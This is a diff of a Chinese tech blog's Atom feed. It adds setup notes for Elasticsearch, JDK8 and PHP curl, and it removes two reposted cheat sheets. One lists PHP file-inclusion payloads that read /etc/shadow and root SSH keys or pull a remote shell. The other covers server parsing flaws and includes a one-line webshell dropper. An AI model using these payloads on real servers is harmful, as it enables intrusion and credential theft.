@@ -4,7 +4,7 @@
   <subtitle><![CDATA[Walk Around]]></subtitle>
   <link href="/atom.xml" rel="self"/>
   <link href="http://ohroot.com/"/>
-  <updated>2015-04-28T07:27:18.000Z</updated>
+  <updated>2015-05-18T13:41:30.000Z</updated>
   <id>http://ohroot.com/</id>
   
   <author>
@@ -13,6 +13,181 @@
   </author>
   
   <generator uri="http://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title><![CDATA[MySQL数据导入ElasticSearch]]></title>
+    <link href="http://ohroot.com/2015/05/18/MySQL%E6%95%B0%E6%8D%AE%E5%AF%BC%E5%85%A5ElasticSearch/"/>
+    <id>http://ohroot.com/2015/05/18/MySQL数据导入ElasticSearch/</id>
+    <published>2015-05-18T13:37:54.000Z</published>
+    <updated>2015-05-18T13:41:30.000Z</updated>
+    <content type="html"><![CDATA[<a id="more"></a>
+<p>Github上主要是有三个项目，分别是<a href="https://github.com/siddontang/go-mysql-elasticsearch" target="_blank" rel="external">go-mysql-elasticsearch</a>、<a href="https://github.com/jprante/elasticsearch-river-jdbc" target="_blank" rel="external">elasticsearch-river-jdbc</a>和<a href="https://github.com/scharron/elasticsearch-river-mysql" target="_blank" rel="external">elasticsearch-river-mysql</a></p>
+<h2 id="go-mysql-elasticsearch">go-mysql-elasticsearch</h2><p>go-mysql-elasticsearch 是一个将MySQL数据导入到Elasticsearch的服务，他是用<code>mysqldump</code>来获取源数据，然后使用binlog同步数据，按照github上说明，他好像是使用go语言开发的一款工具，实现数据迁移。搭建需要go环境支持。<br>他主要可以实现：</p>
+<ul>
+<li>定制化同步，可修改index、type、field等</li>
+<li>可增量同步</li>
+<li>支持基于正则命名的index和type</li>
+</ul>
+<h2 id="elasticsearch-river-mysql">elasticsearch-river-mysql</h2><p>他需要安装一个Elasticsearch插件和一个小型的webserver<br>看了下，安装过程。。。步骤还是比较多，最后操作还是基于http的，example：<code>curl -XPUT &#39;localhost:9200/_river/mydb/_meta&#39; -d &#39;{ &quot;type&quot; : &quot;mysql&quot;, &quot;streamer&quot; : { &quot;host&quot; : &quot;localhost&quot;, &quot;port&quot; : 8080, }, &quot;mysql&quot; : { # Future usage to configure mysql access from the river. _ } }&#39;</code></p>
+<h2 id="elasticsearch-river-jdbc">elasticsearch-river-jdbc</h2><p>他是一个JDBC插件，不仅仅支持mysql，还支持其他数据库。项目现在还在更新，让我感觉靠谱点<br><a href="https://github.com/jprante/elasticsearch-river-jdbc/wiki/Quickstart" target="_blank" rel="external">Quick start</a><br>安装方法：</p>
+<ul>
+<li><code>./bin/plugin --install jdbc --url http://xbib.org/repository/org/xbib/elasticsearch/plugin/elasticsearch-river-jdbc/1.5.0.5/elasticsearch-river-jdbc-1.5.0.5-plugin.zip</code></li>
+<li><code>curl -o mysql-connector-java-5.1.35.zip -L &#39;http://dev.mysql.com/get/Downloads/Connector-J/mysql-connector-java-5.1.35.zip/from/http://cdn.mysql.com/&#39;</code></li>
+<li>解压后<code>cp mysql-connector-java-5.1.28-bin.jar $ES_HOME/plugins/jdbc/</code>，即将mysql connect的一个jar文件拷贝到jdbc的目录下即可。</li>
+</ul>
+<p>参考文章</p>
+<ul>
+<li><a href="http://blog.randywallace.com/blog/2013/08/27/pulling-a-large-mysql-table-into-elasticsearch/" target="_blank" rel="external">Pulling a Large MySQL Table Into Elasticsearch</a></li>
+</ul>
+]]></content>
+    <summary type="html">
+    <![CDATA[<a id="more"></a>
+<p>Github上主要是有三个项目，分别是<a href="https://github.com/siddontang/go-mysql-elasticsearch" target="_blank" rel="external">go-mys]]>
+    </summary>
+    
+      <category term="ElasticSearch" scheme="http://ohroot.com/tags/ElasticSearch/"/>
+    
+      <category term="编程" scheme="http://ohroot.com/categories/%E7%BC%96%E7%A8%8B/"/>
+    
+  </entry>
+  
+  <entry>
+    <title><![CDATA[探索Elasticsearch]]></title>
+    <link href="http://ohroot.com/2015/05/18/%E6%8E%A2%E7%B4%A2Elasticsearch/"/>
+    <id>http://ohroot.com/2015/05/18/探索Elasticsearch/</id>
+    <published>2015-05-18T13:37:36.000Z</published>
+    <updated>2015-05-18T13:39:56.000Z</updated>
+    <content type="html"><![CDATA[<p>Elasticsearch搞了一段时间了，各种曲折，好难受，把一些东西写出来，总结下把</p>
+<a id="more"></a>
+<p>如果想省去很多安装配置，可以直接使用elasticsearch的RTF版本， RTF是Ready To Fly的缩写，它是elasticsearch中文发行版，针对中文集成了相关插件，并带有Demo，方便新手学习,或者在生产环境中直接使用。地址：<a href="https://github.com/medcl/elasticsearch-rtf" target="_blank" rel="external">medcl/elasticsearch-rtf</a></p>
+<h2 id="安装">安装</h2><p>Elasticsearch安装非常简单，官方都说是零配置。但是Elasticsearch安装需要java环境，需要先行安装。<br>然后下载Elasticsearch到你的机器上，文末附有下载链接，下载后解压到一个可执行文件夹，解压命令<code>tar -zvxf elasticsearch-1.5.0.tar.gz</code></p>
+<h2 id="简单配置">简单配置</h2><p>修改<code>ES_HOME/config/elasticsearch.yml</code>文件，修改<code>node.name</code>的值为你的节点名称。如果配置集群需要将<code>cluster.name</code>设置为相同值，我们不修改就是了，直接用默认的elasticsearch。</p>
+<p>此时访问<code>http://ip:9200/</code>就可显示集群的一些基本信息了</p>
+<h2 id="工具安装">工具安装</h2><h3 id="elasticsearchservicewrapper安装">elasticsearchservicewrapper安装</h3><p>这个是对elasticsearch执行命令的包装服务，安装之后，方便elasticsearch的启动，停止等操作。</p>
+<ol>
+<li>下载elasticsearchservicewrapper，<code>git clone https://github.com/elasticsearch/elasticsearch-servicewrapper</code>，然后将目录下的service目录拷贝至ES_HOME/bin目录下。</li>
+<li>简单配置jvm的内存，修改<code>ES_HOME/bin/service/elasticsearch.conf</code>，<code>set.default.ES_HEAP_SIZE=1024</code>，该值根据机器的配置可自定义，一般设置为机器内存的一半。</li>
+<li>安装启动服务，执行命令：<code>ES_HOME/bin/service/elasticsearch install</code></li>
+<li>启动/停止/重启服务，执行命令：<code>service elasticsearch start/stop/restart</code></li>
+</ol>
+<h3 id="插件安装">插件安装</h3><p>下面介绍几个实用的插件：</p>
+<ol>
+<li>head，非常实用的插件。通过head，可以查看集群几乎所有信息，还能进行简单的搜索查询，观察自动恢复的情况等等。安装方法<code>elasticsearch/bin/plugin -install mobz/elasticsearch-head</code>，安装完成后通过<code>http://ip:9200/_plugin/head/</code>，可以查看显示效果。</li>
+<li>bigdesk，它是集群监控插件，通过该插件可以查看整个集群的资源消耗情况，cpu、内存、http链接等等。安装方法：<code>elasticsearch/bin/plugin -install lukas-vlcek/bigdesk</code>。安装完成之后通过：<code>http://ip:9200/_plugin/bigdesk/</code>，可以查看单个节点的资源使用情况，包括JVM、Thread Pools、OS、Process、HTTP&amp;Transport、Indice、File system等状况。</li>
+<li>ik分词，github地址为：<a href="https://github.com/medcl/elasticsearch-analysis-ik" target="_blank" rel="external">elasticsearch-analysis-ik</a>，其安装方法如下：<ul>
+<li>在<code>ES_HOME/plugins</code>目录下新建插件目录analysis-ik。</li>
+<li>将<a href="https://github.com/medcl/elasticsearch-rtf/blob/master/plugins/analysis-ik/elasticsearch-analysis-ik-1.2.6.jar" target="_blank" rel="external">https://github.com/medcl/elasticsearch-rtf/blob/master/plugins/analysis-ik/elasticsearch-analysis-ik-1.2.6.jar</a>  这个文件下载下来，放置到analysis-ik目录下。</li>
+<li>将<a href="https://github.com/medcl/elasticsearch-rtf/tree/master/config/ik" target="_blank" rel="external">https://github.com/medcl/elasticsearch-rtf/tree/master/config/ik</a> 这个ik目录所有内容下载到 <code>ES_HOME/config</code>，目录下。</li>
+<li>编辑文件<code>ES_HOME/config/elasticsearch.yml</code>,添加配置：<code>index.analysis.analyzer.ik.type : &#39;ik&#39;</code>。</li>
+</ul>
+</li>
+</ol>
+<h2 id="一些Elasticsearch的资源">一些Elasticsearch的资源</h2><ul>
+<li><a href="http://www.elasticsearch.org/download/" target="_blank" rel="external">软件下载地址</a></li>
+<li><a href="http://www.elasticsearch.org/guide/en/elasticsearch/client/php-api/current/index.html" target="_blank" rel="external">Elasticsearch-PHP接口描述</a></li>
+<li><a href="http://learnes.sinaapp.com/index.html" target="_blank" rel="external">入门资料</a></li>
+<li><a href="http://learnes.net/" target="_blank" rel="external">中文文档</a></li>
+<li><a href="https://www.gitbook.com/book/endymecy/elasticsearch-guide-chinese/details" target="_blank" rel="external">中文指南</a></li>
+<li><a href="https://www.gitbook.com/book/shgy/mastering-elasticsearch/details" target="_blank" rel="external">Mastering Elasticsearch(中文版)</a></li>
+</ul>
+<p>参考文章</p>
+<ul>
+<li><a href="http://my.oschina.net/xiaohui249/blog/228748" target="_blank" rel="external">ElasticSearch入门 —— 集群搭建</a></li>
+<li><a href="http://segmentfault.com/a/1190000000448816" target="_blank" rel="external">elasticsearch初探</a></li>
+<li><a href="http://blog.csdn.net/laigood/article/details/8207990" target="_blank" rel="external">分布式搜索elasticsearch集群监控工具bigdesk</a></li>
+</ul>
+]]></content>
+    <summary type="html">
+    <![CDATA[<p>Elasticsearch搞了一段时间了，各种曲折，好难受，把一些东西写出来，总结下把</p>]]>
+    
+    </summary>
+    
+      <category term="Elasticsearch" scheme="http://ohroot.com/tags/Elasticsearch/"/>
+    
+      <category term="编程" scheme="http://ohroot.com/categories/%E7%BC%96%E7%A8%8B/"/>
+    
+  </entry>
+  
+  <entry>
+    <title><![CDATA[Linux下安装配置JDK8]]></title>
+    <link href="http://ohroot.com/2015/05/18/Linux%E4%B8%8B%E5%AE%89%E8%A3%85%E9%85%8D%E7%BD%AEJDK8/"/>
+    <id>http://ohroot.com/2015/05/18/Linux下安装配置JDK8/</id>
+    <published>2015-05-18T13:37:12.000Z</published>
+    <updated>2015-05-18T13:43:44.000Z</updated>
+    <content type="html"><![CDATA[<p>linux安装jdk的方法、笔记<br><a id="more"></a></p>
+<h2 id="安装JDK8">安装JDK8</h2><ul>
+<li><p>下载JDK,地址：<a href="http://www.oracle.com/technetwork/cn/java/javase/downloads/index.html" target="_blank" rel="external">click here</a></p>
+</li>
+<li><p>解压安装<br>我们把JDK安装到这个路径：<code>/usr/lib/jvm</code>,如果没有这个目录（第一次当然没有），我们就新建一个目录</p>
+<figure class="highlight dos"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> /usr/lib</span><br><span class="line">sudo <span class="built_in">mkdir</span> jvm</span><br></pre></td></tr></table></figure>
+</li>
+</ul>
+<p>建立好了以后，我们来到刚才下载好的压缩包的目录，解压到我们刚才新建的文件夹里面去，并且修改好名字方便我们管理<br><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo tar zxvf ./jdk-<span class="number">8</span>u20-linux-x64<span class="class">.tar</span><span class="class">.gz</span>  -C /usr/lib/jvm</span><br><span class="line">cd /usr/lib/jvm</span><br><span class="line">sudo mv <span class="function"><span class="title">jdk_</span><span class="params">(版本号)</span></span>/ jdk8</span><br></pre></td></tr></table></figure></p>
+<ul>
+<li>配置环境变量, <code>gedit ~/.bashrc</code>, 在打开的文件的末尾添加<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">export</span> JAVA_HOME=/usr/lib/jvm/jdk8</span><br><span class="line"><span class="built_in">export</span> JRE_HOME=<span class="variable">$&#123;JAVA_HOME&#125;</span>/jre</span><br><span class="line"><span class="built_in">export</span> CLASSPATH=.:<span class="variable">$&#123;JAVA_HOME&#125;</span>/lib:<span class="variable">$&#123;JRE_HOME&#125;</span>/lib</span><br><span class="line"><span class="built_in">export</span> PATH=<span class="variable">$&#123;JAVA_HOME&#125;</span>/bin:<span class="variable">$PATH</span></span><br></pre></td></tr></table></figure>
+</li>
+</ul>
+<p>保存退出，然后输入下面的命令来使之生效<code>source ~/.bashrc</code></p>
+<ul>
+<li>配置默认JDK<br>由于一些Linux的发行版中已经存在默认的JDK，如OpenJDK等。所以为了使得我们刚才安装好的JDK版本能成为默认的JDK版本，我们还要进行下面的配置。<br>执行下面的命令：<figure class="highlight groovy"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">update-alternatives --install <span class="regexp">/usr/</span>bin<span class="regexp">/java java /</span>usr<span class="regexp">/lib/</span>jvm<span class="regexp">/jdk8/</span>bin/java <span class="number">300</span> </span><br><span class="line">update-alternatives --install <span class="regexp">/usr/</span>bin<span class="regexp">/javac javac /</span>usr<span class="regexp">/lib/</span>jvm<span class="regexp">/jdk8/</span>bin/javac <span class="number">300</span> </span><br><span class="line">update-alternatives --install <span class="regexp">/usr/</span>bin<span class="regexp">/jar jar /</span>usr<span class="regexp">/lib/</span>jvm<span class="regexp">/jdk8/</span>bin/jar <span class="number">300</span>  </span><br><span class="line">update-alternatives --install <span class="regexp">/usr/</span>bin<span class="regexp">/javah javah /</span>usr<span class="regexp">/lib/</span>jvm<span class="regexp">/jdk8/</span>bin/javah <span class="number">300</span>  </span><br><span class="line">update-alternatives --install <span class="regexp">/usr/</span>bin<span class="regexp">/javap javap /</span>usr<span class="regexp">/lib/</span>jvm<span class="regexp">/jdk8/</span>bin/javap <span class="number">300</span></span><br></pre></td></tr></table></figure>
+</li>
+</ul>
+<p>注意：如果以上两个命令出现找不到路径问题，只要重启一下计算机在重复上面两行代码就OK了。<br>执行下面的代码可以看到当前各种JDK版本和配置：<code>sudo update-alternatives --config java</code></p>
+<ul>
+<li>测试<br>打开一个终端，输入下面命令：<code>java -version</code>，显示java版本号，即表示java命令已经可以运行了。</li>
+</ul>
+<h2 id="安装_OpenJDK">安装 OpenJDK</h2><ol>
+<li>安装 OpenJDK:<code>sudo apt-get install openjdk-6-jre</code></li>
+<li>检查安装是否成功:<code>java -version</code></li>
+<li>设置 JAVA_HOME 环境变量,在 <code>~/.bashrc</code> 中增加下面一行<code>export JAVA_HOME=/usr/lib/jvm/java-6-openjdk</code></li>
+</ol>
+<p>摘自：<a href="http://dawndiy.com/archives/155/" target="_blank" rel="external">Linux 下安装配置 JDK7</a></p>
+]]></content>
+    <summary type="html">
+    <![CDATA[<p>linux安装jdk的方法、笔记<br>]]>
+    
+    </summary>
+    
+      <category term="Linux" scheme="http://ohroot.com/tags/Linux/"/>
+    
+      <category term="操作系统" scheme="http://ohroot.com/categories/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/"/>
+    
+  </entry>
+  
+  <entry>
+    <title><![CDATA[debian下给php安装curl]]></title>
+    <link href="http://ohroot.com/2015/05/18/debian%E4%B8%8B%E7%BB%99php%E5%AE%89%E8%A3%85curl/"/>
+    <id>http://ohroot.com/2015/05/18/debian下给php安装curl/</id>
+    <published>2015-05-18T13:36:31.000Z</published>
+    <updated>2015-05-18T13:44:59.000Z</updated>
+    <content type="html"><![CDATA[<a id="more"></a>
+<p>查看自己的php5是否已经安装了curl。</p>
+<ol>
+<li>在web服务器目录（ debian下的通常为 /var/www )新建test.php文件</li>
+<li>编辑文件，键入下面一行代码：<code>&lt;?php phpinfo(); ?&gt;</code></li>
+<li>保存文件</li>
+<li>打开浏览器，浏览该网页。例：<a href="http://localhost/test.php" target="_blank" rel="external">http://localhost/test.php</a></li>
+<li>搜索”curl”,看看是否已经安装了curl。没搜到的话肯定是没装了。</li>
+</ol>
+<p>安装方法很简单，只需要一条命令。<br> <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt-get install curl libcurl3 libcurl3-dev php5-curl</span><br></pre></td></tr></table></figure></p>
+<p>安装完毕。记得重启Apache服务器<code>/etc/init.d/apache2 restart</code></p>
+<p>如果仍然有问题，尝试编辑你的php.ini文件（我的是/etc/php5/apache2/php.ini),在最后加上一行：<code>extension=curl.so</code></p>
+<p>保存文件后重启Apache服务器。</p>
+<p>安装gd过程类似，运行下面命令即可：<code>apt-get install php5-gd</code></p>
+]]></content>
+    <summary type="html">
+    <![CDATA[<a id="more"></a>
+<p>查看自己的php5是否已经安装了curl。</p>
+<ol>
+<li>在web服务器目录（ debian下的通常为 /var/www )新建test.php文件</li>
+<li>编辑文件，键入下面一行代码：<code>&lt;?php ]]>
+    </summary>
+    
+      <category term="Linux" scheme="http://ohroot.com/tags/Linux/"/>
+    
+      <category term="编程" scheme="http://ohroot.com/categories/%E7%BC%96%E7%A8%8B/"/>
+    
+  </entry>
   
   <entry>
     <title><![CDATA[python进行Elasticsearch批量索引]]></title>
@@ -537,386 +712,6 @@ OPT 可选项
       <category term="Android" scheme="http://ohroot.com/tags/Android/"/>
     
       <category term="Android" scheme="http://ohroot.com/categories/Android/"/>
-    
-  </entry>
-  
-  <entry>
-    <title><![CDATA[文件包含小总结]]></title>
-    <link href="http://ohroot.com/2014/11/17/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E5%B0%8F%E6%80%BB%E7%BB%93/"/>
-    <id>http://ohroot.com/2014/11/17/文件包含小总结/</id>
-    <published>2014-11-17T01:52:37.000Z</published>
-    <updated>2015-03-12T14:01:33.000Z</updated>
-    <content type="html"><![CDATA[<p>本文转自乌云，原文链接：<a href="http://drops.wooyun.org/tips/3827" target="_blank" rel="external">http://drops.wooyun.org/tips/3827</a><br><a id="more"></a></p>
-<h2 id="前言">前言</h2><p>PHP文件包含漏洞的产生原因是在通过PHP的函数引入文件时，由于传入的文件名没有经过合理的校验，从而操作了预想之外的文件，就可能导致意外的文件泄露甚至恶意的代码注入。最常见的就属于本地文件包含（Local File Inclusion）漏洞了。</p>
-<p>我们来看下面一段index.php代码:</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="variable">$_GET</span>[<span class="string">'func'</span>]) &#123;</span><br><span class="line">   <span class="keyword">include</span> <span class="variable">$_GET</span>[<span class="string">'func'</span>];</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">   <span class="keyword">include</span> <span class="string">'default.php'</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>程序的本意可能是当提交url为<code>http://example.com/index.php?func=add.php</code>时，调用add.php里面的样式内容和功能。直接访问<code>http://example.com/index.php</code>则会包含默认的default.php</p>
-<p>那么问题来了，如果我们提交<code>http://example.com/index.php?func=upload/pic/evil.jpg</code>，且evil.jpg是由黑客上传到服务器上的一个图片，在图片的末尾添加了恶意的php代码，那么恶意的代码就会被引入当前文件执行。如果被包含的文件中无有效的php代码，则会直接把文件内容输出。</p>
-<p>在接下来的内容中会以代码样本作为例子，来给大家介绍各种奇葩猥琐的利用姿势。</p>
-<h2 id="普通本地文件包含">普通本地文件包含</h2><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="preprocessor">&lt;?php</span> <span class="keyword">include</span>(<span class="string">"inc/"</span> . <span class="variable">$_GET</span>[<span class="string">'file'</span>]); <span class="preprocessor">?&gt;</span></span></span><br></pre></td></tr></table></figure>
-<p>包含同目录下的文件：<code>?file=.htaccess</code></p>
-<p>目录遍历：</p>
-<p>linux中这两个文件储存着所有文件的路径，需要root权限:<br><code>?file=../../../../../../../../../var/lib/locate.db</code><br><code>?file=../../../../../../../../../var/lib/mlocate/mlocate.db</code></p>
-<p>包含错误日志：<code>?file=../../../../../../../../../var/log/apache/error.log</code>(使payload进入日志,然后包含日志，可getshell)</p>
-<p>获取web目录或者其他配置文件：<code>?file=../../../../../../../../../usr/local/apache2/conf/httpd.conf</code>(更多-&gt; <a href="http://wiki.apache.org/httpd/DistrosDefaultLayout" target="_blank" rel="external">http://wiki.apache.org/httpd/DistrosDefaultLayout</a>)</p>
-<p>包含上传的附件：<code>?file=../attachment/media/xxx.file</code></p>
-<p>读取session文件：<code>?file=../../../../../../tmp/sess_tnrdo9ub2tsdurntv0pdir1no7</code>(session文件一般在/tmp目录下，格式为sess_[your phpsessid value]，有时候也有可能在/var/lib/php5之类的，在此之前建议先读取配置文件。在某些特定的情况下如果你能够控制session的值，也许你能够获得一个shell)</p>
-<p>如果拥有root权限还可以试试读这些东西：<br><figure class="highlight nimrod"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">/root/.ssh/authorized_keys</span><br><span class="line">/root/.ssh/id_rsa</span><br><span class="line">/root/.ssh/id_rsa.keystore</span><br><span class="line">/root/.ssh/id_rsa.pub</span><br><span class="line">/root/.ssh/known_hosts</span><br><span class="line">/etc/shadow</span><br><span class="line">/root/.bash_history</span><br><span class="line">/root/.mysql_history</span><br><span class="line">/<span class="keyword">proc</span>/self/fd/fd[<span class="number">0</span>-<span class="number">9</span>]* (文件标识符)</span><br><span class="line">/<span class="keyword">proc</span>/mounts</span><br><span class="line">/<span class="keyword">proc</span>/config.gz</span><br></pre></td></tr></table></figure></p>
-<p>如果有phpinfo可以包含临时文件： 参见<a href="http://hi.baidu.com/mmnwzsdvpkjovwr/item/3f7ceb39965145eea984284el" target="_blank" rel="external">http://hi.baidu.com/mmnwzsdvpkjovwr/item/3f7ceb39965145eea984284el</a></p>
-<h2 id="有限制的本地文件包含">有限制的本地文件包含</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="preprocessor">&lt;?php</span> <span class="keyword">include</span>(<span class="string">"inc/"</span> . <span class="variable">$_GET</span>[<span class="string">'file'</span>] . <span class="string">".htm"</span>); <span class="preprocessor">?&gt;</span></span><br></pre></td></tr></table></figure>
-<p><strong> %00截断：</strong><code>?file=../../../../../../../../../etc/passwd%00</code>(需要magic_quotes_gpc=off，PHP小于5.3.4有效)</p>
-<p><strong> %00截断目录遍历：</strong><code>?file=../../../../../../../../../var/www/%00</code>(需要magic_quotes_gpc=off，unix文件系统，比如FreeBSD，OpenBSD，NetBSD，Solaris)</p>
-<p><strong> 路径长度截断：</strong><code>?file=../../../../../../../../../etc/passwd/././././././.[…]/./././././.</code>(php版本小于5.2.8(?)可以成功，linux需要文件名长于4096，windows需要长于256)</p>
-<p><strong> 点号截断：</strong><code>?file=../../../../../../../../../boot.ini/………[…]…………</code>(php版本小于5.2.8(?)可以成功，只适用windows，点号需要长于256)</p>
-<h2 id="普通远程文件包含">普通远程文件包含</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="preprocessor">&lt;?php</span> <span class="keyword">include</span>(<span class="variable">$_GET</span>[<span class="string">'file'</span>]); <span class="preprocessor">?&gt;</span></span><br></pre></td></tr></table></figure>
-<p><strong>远程代码执行：</strong><code>?file=[http|https|ftp]://example.com/shell.txt</code> (需要allow_url_fopen=On并且 allow_url_include=On)</p>
-<p><strong>利用php流input：</strong><code>?file=php://input</code> (需要allow_url_include=On，详细→<a href="http://php.net/manual/en/wrappers.php.php" target="_blank" rel="external">http://php.net/manual/en/wrappers.php.php</a>)</p>
-<p><strong>利用php流filter：</strong><code>?file=php://filter/convert.base64-encode/resource=index.php</code> (同上)</p>
-<p><strong>利用data URIs：</strong> <code>?file=data://text/plain;base64,SSBsb3ZlIFBIUAo=</code>(需要allow_url_include=On)</p>
-<p><strong>利用XSS执行任意代码：</strong><code>?file=http://127.0.0.1/path/xss.php?xss=phpcode</code>(需要allow_url_fopen=On，allow_url_include=On并且防火墙或者白名单不允许访问外网时，先在同站点找一个XSS漏洞，包含这个页面，就可以注入恶意代码了。条件非常极端和特殊- -)</p>
-<h2 id="有限制的远程文件包含">有限制的远程文件包含</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="preprocessor">&lt;?php</span> <span class="keyword">include</span>(<span class="variable">$_GET</span>[<span class="string">'file'</span>] . <span class="string">".htm"</span>); <span class="preprocessor">?&gt;</span></span><br></pre></td></tr></table></figure>
-<p><code>?file=http://example.com/shell</code><br><code>?file=http://example.com/shell.txt?</code><br><code>?file=http://example.com/shell.txt%23</code>(需要allow_url_fopen=On并且allow_url_include=On)<br><code>?file=\evilshare\shell.php</code>(只需要allow_url_include=On)</p>
-<h2 id="延伸">延伸</h2><p>其实在前面也说了，这些漏洞产生原因是PHP函数在引入文件时，传入的文件名没有经过合理的校验，从而操作了预想之外的文件。实际上我们操作文件的函数不只是include()一个，上面提到的一些截断的方法同样可以适用于以下函数：</p>
-<pre><code>fopen
-file_get_contents
-copy
-parse_ini_file
-readfile
-file_put_contents
-<span class="keyword">mkdir</span>
-tempnam
-touch
-move_uploaded_file
-<span class="keyword">rename</span>
-<span class="keyword">unlink</span>
-<span class="keyword">rmdir</span>
-<span class="keyword">require</span>
-require_once
-include_once
-ZipArchive::<span class="keyword">open</span>()
-</code></pre>]]></content>
-    <summary type="html">
-    <![CDATA[<p>本文转自乌云，原文链接：<a href="http://drops.wooyun.org/tips/3827">http://drops.wooyun.org/tips/3827</a><br>]]>
-    
-    </summary>
-    
-      <category term="渗透测试" scheme="http://ohroot.com/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
-    
-      <category term="Web安全" scheme="http://ohroot.com/categories/Web%E5%AE%89%E5%85%A8/"/>
-    
-  </entry>
-  
-  <entry>
-    <title><![CDATA[解析漏洞小总结]]></title>
-    <link href="http://ohroot.com/2014/11/16/%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E%E5%B0%8F%E6%80%BB%E7%BB%93/"/>
-    <id>http://ohroot.com/2014/11/16/解析漏洞小总结/</id>
-    <published>2014-11-16T08:14:31.000Z</published>
-    <updated>2015-03-12T14:02:34.000Z</updated>
-    <content type="html"><![CDATA[<p>本文转自乌云，原文链接：<a href="http://drops.wooyun.org/papers/539。" target="_blank" rel="external">http://drops.wooyun.org/papers/539。</a><br><a id="more"></a></p>
-<h2 id="IIS_5-x/6-0解析漏洞">IIS 5.x/6.0解析漏洞</h2><p>IIS 6.0解析利用方法有两种</p>
-<ol>
-<li>目录解析 <code>/xx.asp/xx.jpg</code></li>
-<li>文件解析 <code>/wooyun.asp;.jpg</code></li>
-</ol>
-<p>第一种，在网站下建立文件夹的名字为 .asp、.asa 的文件夹，其目录内的任何扩展名的文件都被IIS当作asp文件来解析并执行。<br>例如创建目录 wooyun.asp，那么/wooyun.asp/1.jpg 将被当作asp文件来执行。假设黑阔可以控制上传文件夹路径,就可以不管你上传后你的图片改不改名都能拿shell了。</p>
-<p>第二种，在IIS6.0下，分号后面的不被解析，也就是说wooyun.asp;.jpg 会被服务器看成是wooyun.asp。还有IIS6.0 默认的可执行文件除了asp还包含这三种 <code>/wooyun.asa /wooyun.cer /wooyun.cdx</code></p>
-<h2 id="IIS_7-0/IIS_7-5/_Nginx_&lt;8-03畸形解析漏洞">IIS 7.0/IIS 7.5/ Nginx &lt;8.03畸形解析漏洞</h2><p>Nginx解析漏洞:</p>
-<p>在默认Fast-CGI开启状况下,黑阔上传一个名字为wooyun.jpg，内容为<code>&lt;?PHP fputs(fopen(&#39;shell.php&#39;,&#39;w&#39;),&#39;&lt;?php eval($_POST[cmd])?&gt;&#39;);?&gt;</code>的文件，然后访问wooyun.jpg/.php,在这个目录下就会生成一句话木马<code>shell.php</code></p>
-<h2 id="Nginx_&lt;8-03_空字节代码执行漏洞">Nginx &lt;8.03 空字节代码执行漏洞</h2><p>影响版:0.5.,0.6., 0.7 &lt;= 0.7.65, 0.8 &lt;= 0.8.37<br>Nginx在图片中嵌入PHP代码然后通过访问xxx.jpg%00.php来执行其中的代码</p>
-<h2 id="Apache解析漏洞">Apache解析漏洞</h2><p>Apache是从右到左开始判断解析,如果为不可识别解析,就再往左判断。比如<code>wooyun.php.owf.rar</code>,<code>.owf</code>和<code>.rar</code>这两种后缀是apache不可识别解析,apache就会把wooyun.php.owf.rar解析成php。<br>如何判断是不是合法的后缀就是这个漏洞的利用关键,测试时可以尝试上传一个wooyun.php.rara.jpg.png…（把你知道的常见后缀都写上…）去测试是否是合法后缀</p>
-<h2 id="fast-CGI解析漏洞">fast-CGI解析漏洞</h2><p>在web服务器开启fast-CGI的时候，上传图片xx.jpg。内容为：<code>&lt;?php fputs(fopen(&#39;shell.php&#39;,&#39;w&#39;),&#39;&lt;?php eval($_POST[shell])?&gt;&#39;);?&gt;</code><br>这里使用的fput创建一个shell.php文件，并写入一句话。访问路径<code>xx.jpg/.php</code>，就会在该路径下生成一个一句话木马shell.php。这个漏洞在IIS 7.0/7.5，Nginx 8.03以下版本存在。语言环境：PHP，prel，Bourne Shell，C等语言。</p>
-<p>*注：fast-CGI是CGI的升级版，CGI指的是在服务器上提供人机交互的接口，fast-CGI是一种常驻型的CGI。因为CGI每次执行时候，都需要用fork启用一个进程，但是fast-CGI属于激活后就一直执行，不需要每次请求都fork一个进程。比普通的CGI占的内存少。</p>
-<h2 id="其他">其他</h2><p>在windows环境下，<code>xx.jpg[空格]</code>或<code>xx.jpg.</code>这两类文件都是不允许存在的，若这样命名，windows会默认除去空格或点，黑客可以通过抓包，在文件名后加一个空格或者点绕过黑名单。若上传成功，空格和点都会被windows自动消除,这样也可以getshell。</p>
